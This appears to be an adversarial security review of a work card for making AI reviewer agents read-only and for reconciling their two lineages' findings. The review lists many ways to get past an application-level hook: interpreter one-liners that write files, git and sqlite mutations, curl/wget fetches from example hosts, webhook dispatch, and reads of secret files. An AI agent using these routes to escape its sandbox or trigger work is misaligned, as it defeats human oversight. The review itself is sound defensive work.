@@ -1,0 +1,558 @@
+Adversarial Review: reviewer-readonly-and-reconciliation
+Verdict
+Demand changes.
+If forced to vote today without changes, I would reject as written.
+The intent is right: reviewers need visibility, but they must not gain write/dispatch power, and their outputs must be reconciled rather than dumped side by side. However, the card’s acceptance criteria and evidence are too weak to prove those properties. As written, this card can be marked “done” by a superficial implementation that still leaves the reviewers blind, writable, dispatch-capable, or theatrically reconciled.
+The core problem: “read-only” and “reconciliation” are runtime security/process properties, but the card mostly checks static strings and simple happy-path behaviors.
+What this card fails to establish
+1. It does not establish actual read-only enforcement
+The card says reviewers can “read files, run commands, query the spine” while being unable to write, patch, delete, or dispatch.
+That is not enough.
+“Run commands” is incompatible with read-only unless tightly sandboxed
+The implementer note allows:
+ls
+cat
+grep
+git show/diff/log
+sqlite3 SELECT
+But if the reviewer has any generic terminal capability, those are not the only things that can happen. A command execution surface is a write surface unless the OS/process/tooling prevents otherwise.
+Examples that satisfy “we blocked write_file, patch, rm, mv, redirect, chmod, and cis_dispatch_*” while still allowing writes:
+python3 -c 'open("x","w").write("owned")'
+perl -e 'open(F,">","x"); print F "owned"'
+node -e 'require("fs").writeFileSync("x","owned")'
+awk 'BEGIN { print "owned" > "x" }'
+sed -i 's/foo/bar/' file
+dd of=x <<< owned
+tee x <<< owned
+cp /dev/stdin x
+find . -delete
+find . -exec touch {} ;
+git apply patch.diff
+git checkout -- file
+git restore file
+git commit -am "bad"
+git push origin main
+git archive HEAD > out.tar
+tar -cf out.tar /some/path
+zip out.zip file
+unzip evil.zip
+curl -o x http://example/payload
+wget -O x http://example/payload
+sqlite3 db.sqlite "ATTACH 'x' AS evil; CREATE TABLE evil.t(x);"
+The card’s current language only requires blocking some obvious write primitives. It does not establish a deny-by-default command surface.
+The terminal cannot be made safe by string-matching commands
+If the enforcement hook inspects command strings, it will be bypassed by:
+shell metacharacters
+command substitution: $(...), backticks
+pipes and file descriptors
+environment variable assignment: GIT_PAGER=evil git log
+alternate binaries: busybox rm, python, perl, ruby, node
+interpreters
+xargs, env, timeout, nice, script, ssh, socat
+git hooks/pagers/external diff tools
+indirect execution via allowed programs
+symlink/path traversal
+writing to /tmp, sockets, FIFOs, shared memory, databases, caches
+The card does not require any of this to be addressed.
+2. It does not establish filesystem-level read-only guarantees
+The card explicitly says:
+NOT IN THIS CARD: the Docker read-only mount
+But then the DONE WHEN says:
+A reviewer cannot write, patch, or delete any file
+That is a problem.
+Without OS-level enforcement — read-only mounts, non-root user, no writable volumes, no Docker socket, no host mounts, no network side channels — the claim “cannot write any file” depends entirely on an application-level hook.
+That hook may be:
+misconfigured
+bypassed
+not loaded
+overridden by another profile
+unable to inspect nested commands
+fail-open on parse errors
+applied after tool dispatch
+absent in one runtime path
+The card does not require proof that the hook is active, fail-closed, and authoritative.
+3. The evidence greps are weak and partly self-defeating
+The evidence includes:
+grep -c "write_file" enforcement/mwl-proof-v2/profiles/advisor.yaml
+grep -c "cis_dispatch" enforcement/mwl-proof-v2/profiles/advisor.yaml
+grep -c "write_file" enforcement/mwl-proof-v2/profiles/evaluator.yaml
+grep -c "cis_dispatch" enforcement/mwl-proof-v2/profiles/evaluator.yaml
+with the requirement that these return 0.
+This is bad evidence.
+Absence of a string does not prove absence of capability
+A profile can fail these greps while still granting write or dispatch power through:
+a differently named tool
+a generic terminal tool
+a bundled file toolset
+an included file not grepped
+a runtime override
+environment-specific config
+a default allow policy
+a hook that is not actually registered
+Explicit deny rules may make the grep fail
+The card says the hook must be configured to deny write_file, patch, terminal writes, and cis_dispatch_*.
+If those deny rules appear in the grepped YAML, the grep count will be non-zero. So the evidence as written may punish explicit denial configuration and reward omission.
+That is a spec bug.
+Grep does not prove the profile is used
+The file could exist but not be loaded. The runtime could use:
+another profile
+an inherited default
+a higher-precedence override
+a dynamic role assignment
+a stale cached config
+The card needs evidence of effective runtime permissions, not text search.
+4. The reconciliation evidence is cosmetic
+The card requires:
+grep -c "cross-feed|reconcil|other.lineage|other lineage" tools/advisor_review.sh
+and behavioral evidence:
+run a round-1 dual review -> final artifact contains BOTH lineages' findings side by side
+That does not prove reconciliation.
+A script can satisfy this by:
+reconciliation marker
+cat lineage1.md lineage2.md > final.md
+or by:
+echo "## Reconciliation" >> final.md
+or by templating:
+Agreements
+Both lineages agree.
+Disagreements
+None.
+What each thinks the other missed
+Nothing.
+That is not reconciliation. It is formatting.
+The card does not establish:
+that round-1 findings were truly independent
+that each lineage actually received the other’s full findings
+that each lineage responded item-by-item
+that disagreements are preserved
+that the final artifact was not selectively summarized
+that one lineage did not see the other’s findings before round 1
+that the reconciliation step ran at all
+that the final artifact is traceable to both lineages
+“Side by side” is not “reconciled.”
+5. It does not prove independence of the two lineages
+The card says:
+After both lineages produce independent round-1 findings, each is shown the other's findings.
+But it does not define or enforce independence.
+Potential failure modes that would still satisfy the current evidence:
+both lineages share the same session/context
+one lineage starts after seeing partial output from the other
+both lineages are the same model with the same prompt and are merely labeled differently
+the reconciliation step runs before round 1 is finalized
+one lineage’s “round 1” is generated from a template
+both lineages receive the same pre-baked summary instead of raw findings
+one lineage’s output is overwritten before reconciliation
+The card needs a temporal and cryptographic separation requirement: round-1 outputs must be frozen before cross-feed.
+6. It does not prove the reviewers can measure anything
+The source complaint is:
+“the advisory review is a fraud because the reviewers cannot measure anything.”
+But the DONE WHEN only proves:
+a reviewer can read a known file
+a reviewer is blocked from a simple write
+dual findings appear in a final artifact
+That does not prove measurement.
+A reviewer could now:
+read files
+quote files
+produce confident prose
+reconcile vacuously
+while still not running tests, not checking build state, not inspecting logs, not verifying claims, and not measuring anything meaningful.
+The card conflates “has read access” with “can measure.”
+If measurement requires executing tests, linters, builds, schema checks, or runtime queries, the card does not define how that is done safely. If tests require temporary writes, the card excludes the necessary sandbox. If tests are not allowed, the original fraud complaint may remain unresolved.
+7. The behavioral tests are too easy to pass and do not cover the evaluator
+The behavioral evidence says:
+ask advisor to read a known file -> returns content
+ask advisor to write a file -> blocked with a stated reason
+This is weak.
+Read test can be trivial
+The file contents could be:
+already in context
+hardcoded
+mocked
+read from a curated sandbox
+read from a stale snapshot
+limited to one known path
+read from a fixture rather than the real workspace
+A stronger test would use a randomly generated nonce file created by the harness after the reviewer session starts, in an allowed path, and require exact content/hash return.
+Write test is too narrow
+“Ask advisor to write a file” will usually exercise the obvious write_file or edit_file tool. It does not test:
+terminal writes
+interpreter writes
+git writes
+sqlite writes
+redirect bypasses
+symlink tricks
+/tmp writes
+database writes
+API/webhook dispatch
+indirect dispatch via file triggers
+writes by child processes
+writes after tool chaining
+The evaluator is under-tested
+The card mentions advisor and evaluator profiles, but the behavioral evidence only exercises the advisor.
+The evaluator must receive the same positive and negative tests.
+8. “No dispatch” is not established
+The card checks for absence of cis_dispatch strings and says:
+A reviewer cannot start a pipeline run
+But dispatch is not only a named tool.
+A reviewer could dispatch or trigger work by:
+curl/wget to a webhook
+git push
+writing to a watched queue/table/file
+updating a spine row that triggers automation
+invoking CI CLI tools
+sending a message to a queue
+creating a cron/at job
+using cloud CLIs
+talking to a local agent socket
+using docker, kubectl, systemctl
+invoking another tool that has dispatch rights
+embedding instructions that downstream automation executes
+The card does not define dispatch broadly enough and does not require network isolation, egress denial, or side-effect-free database access.
+9. “Blocked with a stated reason” is not verified properly
+The card requires:
+blocked with a stated reason, not silently allowed
+But it does not say how that is verified.
+A model transcript can say:
+“I was blocked because policy forbids writes.”
+That is not proof.
+The evidence should require:
+enforcement log entry
+denied tool name
+denied command/arguments
+rule ID
+role ID
+timestamp
+unchanged filesystem state
+no spawned job
+no partial artifact
+fail-closed behavior on unknown/parsing errors
+Otherwise the “stated reason” can be cosmetic.
+10. It does not handle secrets, exfiltration, or unsafe reads
+Read-only is not harmless.
+If reviewers can read arbitrary files, they may read:
+secrets
+tokens
+SSH keys
+environment variables
+database credentials
+cloud credentials
+private user data
+other projects
+/proc/self/environ
+.env
+.git/config with tokens
+spine credentials
+Then they can leak those through their review output.
+The card does not define:
+allowed path prefixes
+denied path prefixes
+secret redaction
+environment isolation
+output sanitization
+data classification
+whether reviewer output is untrusted
+A reviewer could pass the card while exposing sensitive material in the reconciled artifact.
+11. It does not define failure behavior
+What happens if:
+the enforcement hook fails?
+a command cannot be parsed?
+a tool is unknown?
+the reconciliation step crashes?
+one lineage produces no findings?
+one lineage tries to write?
+cross-feed times out?
+the final artifact cannot be produced?
+the two lineages irreconcilably disagree?
+a reviewer attempts dispatch?
+The card does not say.
+For a security-relevant card, the default must be fail-closed and visible. The current card can be implemented fail-open and still pass if the happy path works.
+What result would satisfy this card while still being wrong?
+1. A passing implementation that still allows writes
+The implementer removes write_file and cis_dispatch strings from the advisor/evaluator YAML. The greps return 0.
+They leave a generic terminal tool enabled. The hook blocks obvious commands like rm, mv, and shell redirects.
+But the reviewer can still write via:
+python3 -c 'open("pwned","w").write("x")'
+or:
+git apply malicious.patch
+or:
+sqlite3 app.db "ATTACH 'pwned.db' AS x; CREATE TABLE x.t(y);"
+The behavioral test asks the advisor to “write a file.” The advisor tries write_file, gets blocked, and reports a reason.
+The card passes. The reviewer still has write capability.
+2. A passing implementation that still allows dispatch
+The implementer blocks cis_dispatch_*.
+But the reviewer can still run:
+curl -X POST https://pipeline-trigger.example/run
+or:
+git push origin HEAD
+or:
+sqlite3 spine.db "UPDATE jobs SET state='queued' WHERE id=123;"
+The greps pass. The named dispatch tool is absent. But dispatch still happens through terminal, network, git, or the spine.
+3. A passing implementation where reconciliation is fake
+The implementer adds this to tools/advisor_review.sh:
+reconciliation marker
+cat lineage1_findings.md lineage2_findings.md > final_review.md
+The final artifact contains both lineages side by side.
+The reconciliation grep passes. The behavioral artifact passes.
+But:
+neither lineage saw the other’s findings
+no agreements/disagreements were computed
+no missed items were identified
+the final artifact is just concatenation
+Eric receives a cosmetically “reconciled” file
+The card passes. The original problem remains.
+4. A passing implementation with vacuous reconciliation
+The reconciliation step runs, but each lineage returns:
+I agree with the other lineage.
+I have no disagreements.
+I believe the other lineage missed nothing.
+The final artifact contains all required sections.
+But the reconciliation is empty. It can hide false consensus, laziness, model collapse, or shared bias. The card does not require evidence that objections were actually considered.
+5. A passing implementation where only one role is tested
+The advisor is tested for read and blocked write.
+The evaluator is not behaviorally tested.
+The evaluator profile may still have excessive permissions, but the evidence only exercises the advisor.
+The card says both roles matter, but the proof only covers one.
+6. A passing implementation where reviewers read a stale or curated snapshot
+The reviewer can read a known file in a curated fixture directory and quote it back.
+But it cannot see the actual live workspace, or sees a sanitized copy that omits problematic files.
+The DONE WHEN says:
+A reviewer can read an existing file and quote its contents back
+It does not say the file must be a fresh, harness-selected file from the real review target.
+So the reviewer can appear un-blinded while still being carefully blinded to the things that matter.
+7. A passing implementation where “blocked” still leaves side effects
+The hook returns:
+“Write blocked by policy.”
+But the attempted operation may have already:
+created a temp file
+mutated a cache
+changed file metadata
+spawned a subprocess
+written to /tmp
+updated a database WAL
+logged sensitive args
+triggered a watcher
+The card only requires a stated reason, not proof of zero side effects.
+8. A passing implementation where the final artifact hides dissent
+The final artifact says:
+Reconciled result: both lineages agree.
+But the underlying raw findings contained serious objections.
+The card says Eric receives the reconciled result, not two independent opinions. But it does not require that the final artifact include the raw findings, hashes, trace IDs, or an appendix preserving dissent.
+A summarizer can quietly flatten disagreement.
+Specific gaps to fix before approval
+A. Replace grep evidence with effective-permission evidence
+Do not approve based on:
+grep -c "write_file" profile.yaml
+Require something like:
+an effective permission report for advisor and evaluator
+a policy engine evaluation result
+runtime tool schema dump showing only allowed capabilities
+startup assertion that the enforcement hook is active
+fail-closed test for unknown tools
+fail-closed test for unparsable commands
+proof that the tested profile is the live profile
+The evidence should answer:
+What can this role actually do at runtime?
+not:
+Which strings appear in a YAML file?
+B. Define read-only as deny-by-default, not “terminal minus bad commands”
+The card should require:
+no generic shell access
+no arbitrary command string execution
+allowlisted executable plus allowlisted argument patterns only
+no pipes unless explicitly safe
+no redirects
+no backgrounding
+no subshells
+no environment variable assignment
+no command substitution
+no interpreters
+no package managers
+no network CLIs
+no git mutation commands
+no git hooks/pager/external diff execution
+no sqlite dot-commands
+no ATTACH
+no loadable extensions
+no write-capable DB connection
+no access to Docker socket
+no access to systemd/cron/at
+no access to cloud metadata or cloud CLIs
+Even better: do not give reviewers raw terminal. Give them mediated read-only tools.
+C. Require OS-level read-only enforcement or declare it as a hard dependency
+The card cannot credibly say “cannot write any file” unless at least one of these is true:
+the reviewer filesystem is mounted read-only
+the reviewer runs as a non-privileged user without write permissions
+writable paths are explicitly scoped and isolated
+the container runtime enforces read-only root filesystem
+the sandbox prevents process-level writes
+If Docker read-only mount is out of scope, then the card should not claim full write prevention. It should say:
+Application-level write blocking only; OS-level guarantee deferred to dependency X.
+Otherwise the DONE WHEN overpromises.
+D. Expand negative tests far beyond “ask advisor to write a file”
+Require a red-team test suite for both advisor and evaluator.
+Minimum negative tests:
+Direct tool writes:
+write_file
+edit_file
+patch
+apply_patch
+rename_file
+delete_file
+create_directory
+delete_directory
+Terminal writes:
+echo > file
+tee file
+cp
+mv
+rm
+touch
+mkdir
+dd of=file
+python -c write
+perl -e write
+node -e write
+awk write
+sed -i
+find -delete
+find -exec
+xargs
+Git writes/dispatch:
+git apply
+git checkout
+git restore
+git commit
+git push
+git reset
+git clean
+git merge
+git rebase
+git stash
+git archive > file
+Database writes:
+INSERT
+UPDATE
+DELETE
+CREATE
+DROP
+ATTACH
+PRAGMA mutations if applicable
+.shell
+.read
+.output
+.load
+Dispatch:
+direct cis_dispatch_*
+webhook via curl
+wget
+git push
+queue publish
+spine mutation
+file-trigger creation
+cron/at/systemd if available
+For each test, require:
+denial reason from enforcement layer
+policy rule ID
+no state change
+filesystem hash/manifest unchanged
+no new process/job/artifact
+audit log entry
+E. Make the read test non-gameable
+Instead of:
+ask advisor to read a known file
+Require:
+harness creates a random nonce file after session start
+file path is selected by harness
+file is inside an allowed path
+reviewer must return exact contents or hash
+tool-call log shows the read
+reviewer is also tested against a prohibited path and denied
+reviewer cannot read secrets/environment files
+reviewer cannot traverse via symlinks
+This proves actual instrumented read access, not memorization or fixture cheating.
+F. Require proof of reconciliation, not just a final side-by-side file
+The reconciliation requirement should produce a machine-verifiable bundle.
+Require:
+Round-1 advisor findings artifact (hash, timestamp, role/session ID)
+Round-1 evaluator findings artifact (hash, timestamp, role/session ID)
+Cross-feed event logs (advisor received evaluator round-1 hash/content, evaluator received advisor round-1 hash/content)
+Round-2 reconciliation responses (advisor item-by-item response to evaluator, evaluator item-by-item response to advisor, explicit agreements, explicit disagreements, explicit “missed by other lineage” claims)
+Final Eric-facing artifact (includes reconciliation summary, includes or references raw round-1 findings, includes hashes/trace IDs, preserves dissent, cannot silently collapse disagreements)
+Also require a test where a seeded disagreement fixture forces the system to show disagreement handling. A happy-path dual run is not enough.
+G. Prevent pre-contamination
+The card must require:
+lineage A cannot see lineage B’s findings before A’s round-1 output is finalized
+round-1 outputs are stored before cross-feed
+no shared mutable scratchpad between lineages
+no common context that contains the other lineage’s draft
+reconciliation step cannot start until both round-1 outputs exist
+Otherwise “independent round-1” is just a claim.
+H. Require both lineages to be tested equally
+The evidence must include:
+advisor positive read test
+evaluator positive read test
+advisor negative write/dispatch tests
+evaluator negative write/dispatch tests
+advisor reconciliation trace
+evaluator reconciliation trace
+The current behavioral evidence is advisor-centric.
+I. Define and enforce “measurement”
+If the purpose is to stop reviewers from being unable to measure anything, the card must define what measurements they are allowed/expected to perform.
+Examples:
+read source files
+read logs
+query spine state
+run read-only validation commands
+run tests in an ephemeral sandbox
+inspect build artifacts
+compare hashes
+check schema state
+inspect git history
+If tests require writes, define a safe ephemeral scratch area:
+tmpfs only
+no access to source tree
+no network
+destroyed after run
+size/time quotas
+audited
+If measurement is not defined, the card may pass while the original fraud complaint remains true.
+J. Add auditability requirements
+Require logs for:
+tool invocation
+role
+lineage
+tool name
+arguments or argument hash
+allow/deny decision
+rule ID
+timestamp
+duration
+result hash
+error reason
+Eric should not have to trust prose. The artifact should include evidence pointers.
+K. Treat reviewer output as untrusted
+Reviewers may be compromised, hallucinating, or prompt-injected.
+Require:
+reviewer output is not executed
+reviewer output is not used to change permissions
+reviewer output is sanitized before downstream automation
+embedded commands/instructions are not honored
+secrets found by accident are redacted or excluded
+final artifact does not become a write/dispatch vector
+The card currently treats reviewers as honest once they have read tools.
+Plain conclusion
+I would demand changes because the card’s current DONE WHEN and EVIDENCE can be satisfied by an implementation that is still insecure or still fraudulent.
+The card needs to shift from:
+“The config file does not contain bad strings, and a simple demo worked.”
+to:
+“We can prove the effective runtime permissions are read-only, prove indirect write/dispatch paths are blocked, prove both roles were tested, prove reconciliation actually occurred, and preserve an auditable trail that Eric can trust.”
+Without those changes, a passing result could still mean:
+reviewers can write via terminal or database bypasses
+reviewers can dispatch via network/git/spine side effects
+reconciliation is just concatenated text
+disagreements are hidden
+the evaluator is untested
+reviewers still cannot meaningfully measure anything
+So: demand changes; reject as written if unchanged.
+
